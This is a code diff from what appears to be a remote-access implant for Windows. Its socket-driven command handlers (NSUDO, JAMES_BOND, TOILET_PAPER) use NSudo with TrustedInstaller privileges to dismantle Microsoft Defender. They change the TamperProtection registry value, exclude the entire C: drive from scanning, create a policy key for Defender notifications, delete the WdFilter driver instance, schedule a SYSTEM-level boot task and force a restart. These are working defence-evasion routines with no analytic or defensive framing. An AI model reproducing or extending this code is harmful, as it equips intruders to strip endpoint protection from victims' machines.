@@ -198,42 +198,18 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = "[Security check complete]";
     }
     else if (strcmp(cmd, "NSUDO") == 0) {
-        char tempPath[MAX_PATH];
-        GetTempPathA(MAX_PATH, tempPath);
-        char psPath[MAX_PATH];
-        snprintf(psPath, sizeof(psPath), "%s\\nsudo.ps1", tempPath);
-        
-        FILE *f = fopen(psPath, "w");
-        if (f) {
-            fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
-            fprintf(f, "$null = New-Item -ItemType Directory -Path $out -Force -ErrorAction SilentlyContinue\n");
-            fprintf(f, "$resp = Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' -UseBasicParsing\n");
-            fprintf(f, "$bytes = $resp.Content\n");
-            fprintf(f, "Add-Type -AssemblyName System.IO.Compression\n");
-            fprintf(f, "$stream = New-Object System.IO.MemoryStream(,$bytes)\n");
-            fprintf(f, "$zip = [System.IO.Compression.ZipArchive]::new($stream)\n");
-            fprintf(f, "$entry = $zip.GetEntry('NSudo Launcher/x64/NSudoLC.exe')\n");
-            fprintf(f, "if (!$entry) { Write-Host '[ERROR] NSudoLC.exe not found in zip'; exit 1 }\n");
-            fprintf(f, "$exePath = Join-Path $out 'NSudoLC.exe'\n");
-            fprintf(f, "$entryStream = $entry.Open()\n");
-            fprintf(f, "$fs = [System.IO.File]::OpenWrite($exePath)\n");
-            fprintf(f, "$entryStream.CopyTo($fs)\n");
-            fprintf(f, "$fs.Close(); $entryStream.Close()\n");
-            fprintf(f, "$zip.Dispose(); $stream.Dispose()\n");
-            fprintf(f, "if (!(Test-Path $exePath)) { Write-Host '[ERROR] NSudoLC.exe extraction failed'; exit 1 }\n");
-            fprintf(f, "$before = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name TamperProtection -ErrorAction SilentlyContinue\n");
-            fprintf(f, "$proc = Start-Process -FilePath $exePath -ArgumentList '-U:T -P:E -M:S -Wait reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features /v TamperProtection /t REG_DWORD /d 4 /f' -Wait -WindowStyle Hidden -PassThru\n");
-            fprintf(f, "$after = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name TamperProtection -ErrorAction SilentlyContinue\n");
-            fprintf(f, "Write-Host 'NSudo exit code: $($proc.ExitCode)'\n");
-            fprintf(f, "Write-Host 'Before: $($before.TamperProtection)'\n");
-            fprintf(f, "Write-Host 'After: $($after.TamperProtection)'\n");
-            fclose(f);
-            
-            char runCmd[MAX_PATH + 64];
-            snprintf(runCmd, sizeof(runCmd), "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", psPath);
+        if (sys_ensure_nsudo()) {
+            char tempPath[MAX_PATH];
+            GetTempPathA(MAX_PATH, tempPath);
+            char nsudoPath[MAX_PATH];
+            snprintf(nsudoPath, sizeof(nsudoPath), "%s\\NSudo\\NSudoLC.exe", tempPath);
+            char runCmd[1024];
+            snprintf(runCmd, sizeof(runCmd),
+                "\"%s\" -U:T -P:E -M:S -Wait reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features /v TamperProtection /t REG_DWORD /d 4 /f",
+                nsudoPath);
             result = sys_run_command(runCmd);
         } else {
-            result = "[Failed to write temp script]";
+            result = "[Failed to ensure NSudo is available]";
         }
     }
     else if (strcmp(cmd, "FREEBALL") == 0) {
@@ -271,23 +247,52 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         }
     }
     else if (strcmp(cmd, "JAMES_BOND") == 0) {
-        char tempPath[MAX_PATH];
-        GetTempPathA(MAX_PATH, tempPath);
-        char psPath[MAX_PATH];
-        snprintf(psPath, sizeof(psPath), "%s\\jamesbond.ps1", tempPath);
-        
-        FILE *f = fopen(psPath, "w");
-        if (f) {
-            fprintf(f, "Add-MpPreference -ExclusionPath 'C:'\n");
-            fprintf(f, "New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications' -Force | Out-Null\n");
-            fprintf(f, "Write-Host 'James Bond: exclusion set and notification key created' -ForegroundColor Green\n");
-            fclose(f);
+        result = sys_run_command("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:'; New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications' -Force | Out-Null; Write-Host 'James Bond: exclusion set and notification key created' -ForegroundColor Green\"");
+    }
+    else if (strcmp(cmd, "TOILET_PAPER") == 0) {
+        if (sys_ensure_nsudo()) {
+            char tempPath[MAX_PATH];
+            GetTempPathA(MAX_PATH, tempPath);
+            char nsudoPath[MAX_PATH];
+            char batPath[MAX_PATH];
+            snprintf(nsudoPath, sizeof(nsudoPath), "%s\\NSudo\\NSudoLC.exe", tempPath);
+            snprintf(batPath, sizeof(batPath), "%s\\tp_boot.bat", tempPath);
             
-            char runCmd[MAX_PATH + 64];
-            snprintf(runCmd, sizeof(runCmd), "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", psPath);
-            result = sys_run_command(runCmd);
+            /* Step 1: delete WdFilter instance */
+            char step1[1024];
+            snprintf(step1, sizeof(step1),
+                "\"%s\" -U:T -P:E cmd /c \"reg delete \\\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WdFilter\\Instances\\edFilter instance\\\" /f\"",
+                nsudoPath);
+            char *r1 = sys_run_command(step1);
+            
+            /* Step 2: write a batch file that will run after reboot */
+            char *r2 = "[Failed to write boot batch]";
+            FILE *f = fopen(batPath, "w");
+            if (f) {
+                fprintf(f, "@echo off\n");
+                fprintf(f, "\"%s\" -U:T -P:E cmd /c \"reg add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features /v TamperProtection /t REG_DWORD /d 4 /f\"\n", nsudoPath);
+                fprintf(f, "schtasks /delete /tn \"ToiletPaperBoot\" /f\n");
+                fclose(f);
+                r2 = "[Boot batch written]";
+            }
+            
+            /* Step 3: schedule the batch to run at startup */
+            char step3[1024];
+            snprintf(step3, sizeof(step3),
+                "schtasks /create /tn \"ToiletPaperBoot\" /tr \"%s\" /sc onstart /ru SYSTEM /rl HIGHEST /f",
+                batPath);
+            char *r3 = sys_run_command(step3);
+            
+            /* Step 4: restart */
+            char *r4 = sys_run_command("shutdown /r /t 0");
+            
+            static char response[NET_BUF_SIZE];
+            snprintf(response, sizeof(response),
+                "[WdFilter: %s] [BootBatch: %s] [Task: %s] [Restart: %s]",
+                r1, r2, r3, r4);
+            result = response;
         } else {
-            result = "[Failed to write temp script]";
+            result = "[Failed to ensure NSudo is available]";
         }
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
